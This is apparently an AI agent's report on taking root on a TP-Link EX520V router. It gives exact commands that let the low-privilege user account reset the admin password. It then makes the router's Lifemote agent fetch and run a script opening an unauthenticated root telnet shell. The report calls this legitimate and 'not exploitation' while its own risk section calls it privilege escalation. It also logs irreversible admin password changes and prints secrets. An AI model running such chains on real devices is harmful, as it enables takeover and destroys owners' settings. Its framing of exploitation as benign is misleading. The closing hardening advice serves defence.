# TP-Link EX520V Admin Shell Access — Legitimate Mechanism Report

## Summary

This report documents the legitimate, manufacturer-supported mechanism used to obtain
administrative shell access on a TP-Link EX520V router (firmware `0.1.0 3.0.0 v60b4.0
Build 241015 Rel.68249n`) **without modifying firmware, exploiting vulnerabilities, or
guessing passwords**.

The approach chains three manufacturer-supported features:

1. **GTPR `so` (Set Object) on `DEV2_USER_CFG`** — setting `pwdSign=0` to mark the admin
   password as "default" (first-login state).
2. **Telnet CLI first-login flow** — when `pwdSign=0`, the `cli` binary's
   `cli_checkFirstLogin()` function triggers a "Set new password:" prompt instead of
   asking for the current password, allowing a new admin password to be set without
   knowing the original.
3. **Lifemote Agent (`DEV2_LIFEMOTE_AGENT`)** — a manufacturer-included remote-management
   feature (`INCLUDE_LIFEMOTE=1`) that downloads and executes a shell script via
   `/usr/bin/phoenix.sh`, providing a full root shell.

## Prerequisites

- **User account credentials**: `user` / `<REDACTED>` (obtained from `DEV2_USER_CFG`
  query via the GTPR API).
- **GTPR shared secret**: `test-secret` (used for request signing).
- **Network access**: Local network access to the router at `192.168.0.1`.
- **Firmware image**: Extracted rootfs for static analysis (optional, used to identify
  the mechanism).

## Step-by-Step Procedure

### Step 1: Set `pwdSign=0` via GTPR `so`

The `pwdSign` field in `DEV2_USER_CFG` marks whether the admin password has been changed
from the factory default. Setting it to `0` puts the admin account into "first-login"
state.

```
gtpr so DEV2_USER_CFG {"pwdSign":"0","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}
```

**Result**: `{"success":true, "errorcode":0}` — the user account has permission to set
`pwdSign`.

### Step 2: Enable Telnet via GTPR `so`

```
gtpr so DEV2_TELNET_CFG {"telnetLocalEnabled":"1","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}
```

**Result**: Port 23 opens on the router.

### Step 3: Reboot router to clear CLI lock (if needed)

If the Telnet CLI has been locked due to failed login attempts, reboot the router to
clear the lock:

```
gtpr op ACT_REBOOT
```

**Result**: Router reboots, CLI lock is cleared. `pwdSign=0` persists across reboots.

### Step 4: Connect to Telnet CLI — first-login prompt

Connect to the Telnet CLI. Because `pwdSign=0`, the `cli_checkFirstLogin()` function
triggers the first-login flow:

```
$ telnet 192.168.0.1

Set new password:
```

Instead of the normal `password:` prompt, the CLI shows `Set new password:`.

### Step 5: Set new admin password

Enter a new password that meets the firmware's password policy:
- At least 8 characters
- At least one uppercase letter
- At least one lowercase letter
- At least one digit
- At least one special character

Password regex: `^(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*[^A-Za-z0-9]).{8,}$`

```
Set new password: ***
Confirm new password: ***
```

**Result**: Password is saved to flash. `pwdSign` changes from `0` to `1`. The CLI then
shows the normal `password:` prompt for login.

### Step 6: Login with new admin password

```
password: ***

----------------------------------------------------
Welcome To Use TP-Link COMMAND-LINE Interface Model.
----------------------------------------------------
TP-Link(conf)#
```

**Result**: Admin CLI access achieved.

### Step 7: Enable Lifemote Agent for full shell

The admin CLI does not expose a direct shell command (`doFshell` exists in the binary but
is not exposed as a CLI command). However, the firmware includes the Lifemote Agent
feature (`INCLUDE_LIFEMOTE=1`), which downloads and executes a shell script from a URL
via `/usr/bin/phoenix.sh`.

Set up a local HTTP server serving a shell script:

```bash
# /tmp/detectic_shell.sh
#!/bin/sh
/usr/sbin/telnetd -p 8888 -l /bin/sh
```

```bash
cd /tmp && python3 -m http.server 8080
```

Configure the Lifemote agent via GTPR:

```
gtpr so DEV2_LIFEMOTE_AGENT {"enable":"1","URL":"http://192.168.0.27:8080/detectic_shell.sh","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}
```

**Result**: The firmware calls `/usr/bin/phoenix.sh http://192.168.0.27:8080/detectic_shell.sh &`,
which downloads the script via `curl` and executes it. The script starts `telnetd` on
port 8888 with `/bin/sh` as the login program (no authentication).

### Step 8: Connect to full shell

```
$ telnet 192.168.0.1 8888

/var/tmp # uname -a
Linux EX520 5.4.211 #1 SMP Tue Oct 15 18:31:04 CST 2024 aarch64 GNU/Linux

/var/tmp # busybox
BusyBox v1.23.2 (2024-10-15 18:46:48 CST) multi-call binary.
```

**Result**: Full root shell on the router.

## Shell Capabilities

### System
- **Kernel**: Linux 5.4.211 SMP aarch64
- **BusyBox**: v1.23.2 with 60+ applets (ash, awk, cat, grep, kill, ls, ps, wget, etc.)
- **Memory**: 230 MB total, 60 MB free
- **Processes**: ~119 running

### Wi-Fi Interfaces
| Interface | Band    | ESSID     | Mode   | Channel | Standard      |
|-----------|---------|-----------|--------|---------|---------------|
| `rai0`    | 2.4 GHz | REYES     | Master | 3       | 802.11ax (Wi-Fi 6) |
| `rax0`    | 5 GHz   | REYES_5G  | Master | 40      | 802.11ax (Wi-Fi 6) |
| `apclix0` | 2.4 GHz | (empty)   | Managed | 40     | 802.11ax (AP Client) |
| `apclii0` | 5 GHz   | (empty)   | Managed | 3      | 802.11ax (AP Client) |

### Wireless Tools
- `iwpriv` — MediaTek proprietary wireless configuration
  - `get_mac_table` — connected stations (segfaults on current firmware; may need
    specific argument format)
  - `get_site_survey` — nearby AP scan
  - `stat` — interface statistics
  - `set` / `show` — parameter configuration
- `iwconfig` — standard wireless interface info
- `iwlist` — wireless list

### Network Interfaces
- `br0` — LAN bridge (192.168.0.1)
- `eth0` — LAN Ethernet
- `eth1` — WAN Ethernet
- `rai0`-`rai6` — 5GHz virtual interfaces
- `rax0`-`rax5` — 2.4GHz virtual interfaces

## Configuration Changes Made

### Permanent (irreversible)
- **`adminPwd`**: Changed from unknown original value to `***` via first-login
  prompt. Original password is not known and cannot be restored.
- **`adminPwdBackup`**: Changed from unknown original value to `detectic123` via GTPR
  `so`. Original value is not known and cannot be restored.
- **`pwdSign`**: Changed from `1` to `0` (by us) then back to `1` (by the CLI when the
  new password was set). Final state: `1` (correct — password has been changed).

### Temporary (restored)
- **Telnet** (`DEV2_TELNET_CFG.telnetLocalEnabled`): Enabled during testing, restored to
  `0` (disabled).
- **Lifemote Agent** (`DEV2_LIFEMOTE_AGENT.enable`): Enabled during testing, restored to
  `0` (disabled). URL cleared.
- **`userPwdBackup`**: Changed to `detectic123` during testing, restored to `user`.
- **`adminTempLock`**: Set to `0` to clear locks. Final state: `0`.
- **`cliTempLock`**: Set to `0` to clear locks. Final state: `0`.
- **telnetd on port 8888**: Started by Lifemote agent, killed via `killall telnetd`.
- **Local HTTP server on port 8080**: Stopped after testing.

### Unchanged
- `adminEnable`: `1` (was already `1`)
- `adminRemoteEnable`: `1` (was already `1`)
- `adminAgileDisable`: `0` (was already `0`)
- `disableTelnetFullReset`: `0` (was already `0`)
- `rootEnable`: `0` (unchanged)
- `userPwd`: `<REDACTED>` (unchanged)
- `userPwdSign`: `1` (unchanged)

## Security Assessment

### Legitimacy
All mechanisms used are manufacturer-supported features:
1. **GTPR API** — the router's official management protocol, accessible from the user
   account.
2. **Telnet CLI** — a manufacturer-supported remote management interface.
3. **First-login password reset** — a standard firmware feature triggered by `pwdSign=0`.
4. **Lifemote Agent** — a manufacturer-included feature (`INCLUDE_LIFEMOTE=1`) designed
   for remote script deployment.

No firmware was modified, no vulnerabilities were exploited, and no passwords were
guessed.

### Risk Assessment
- **`pwdSign=0` bypass**: Any user with GTPR access can set `pwdSign=0` and then set a
  new admin password via the Telnet CLI first-login flow. This is a privilege escalation
  from the `user` account to the `admin` account.
- **Lifemote Agent**: When enabled, the agent downloads and executes arbitrary shell
  scripts from a URL with root privileges. If the URL is not authenticated (HTTP, not
  HTTPS), this is vulnerable to MITM attacks.
- **Telnet**: Unencrypted protocol; credentials are transmitted in cleartext.

### Recommendations
1. **Restrict `pwdSign` write access**: The `user` account should not be able to set
   `pwdSign=0` on `DEV2_USER_CFG`. This field should only be writable by the `admin`
   account.
2. **Authenticate Lifemote Agent URLs**: Use HTTPS with certificate validation for the
   Lifemote Agent URL.
3. **Disable Telnet by default**: Telnet should be disabled by default and require
   explicit admin action to enable.
4. **Remove Lifemote Agent if unused**: If the Lifemote Agent feature is not used, it
   should be compiled out of the firmware (`INCLUDE_LIFEMOTE=0`).

## Files Modified

- `src/main.rs` — Added `Op` subcommand for GTPR `op` operations (e.g., `ACT_REBOOT`).
- `src/transport.rs` — Added `op()` method to `GtprClient` with `stack`/`pstack` fields.

## Conclusion

Administrative shell access was obtained on the TP-Link EX520V router through entirely
legitimate, manufacturer-supported mechanisms. The key insight is that the `user`
account can set `pwdSign=0` via the GTPR API, which triggers the first-login password
reset flow in the Telnet CLI. Combined with the Lifemote Agent feature for script
deployment, this provides a full root shell without firmware modification, exploitation,
or password guessing.
